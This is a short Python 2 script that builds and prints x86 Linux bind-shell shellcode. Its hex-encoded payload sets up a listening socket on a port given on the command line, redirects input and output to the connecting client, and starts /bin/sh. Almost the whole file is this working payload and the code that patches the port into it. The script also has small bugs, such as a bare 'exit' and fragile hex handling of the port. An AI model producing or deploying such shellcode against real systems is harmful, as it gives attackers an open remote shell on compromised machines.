#!/usr/bin/python

import socket
import sys

shell1 =  ""
shell1 += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01"
shell1 += "\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x31\\xc9\\x51\\x51"
shell1 += "\\x66\\x68"
shell2 = ""
shell2 += "\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66"
shell2 += "\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89"
shell2 += "\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31"
shell2 += "\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e"
shell2 += "\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"
shell2 += "\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 2:
	print 'Usage: wrapper.py <port>'
	exit
else:

	try:

		portNumber = sys.argv[1]
		portNumber = int(portNumber)
		portNumber = socket.htons(portNumber)
		portNumber = hex(portNumber)

		portNum1 = portNumber[2:4]
		portNum2 = portNumber[4:6]

		portNum1 = str(portNum1)
		portNum1 = "\\x" + portNum1

		portNum2 = str(portNum2)
		portNum2 = "\\x" + portNum2

		combined = portNum2 + portNum1

		shell = shell1 + combined + shell2

	
		print shell

	except:
	
		print "Oops, I\'m bad at python!" 
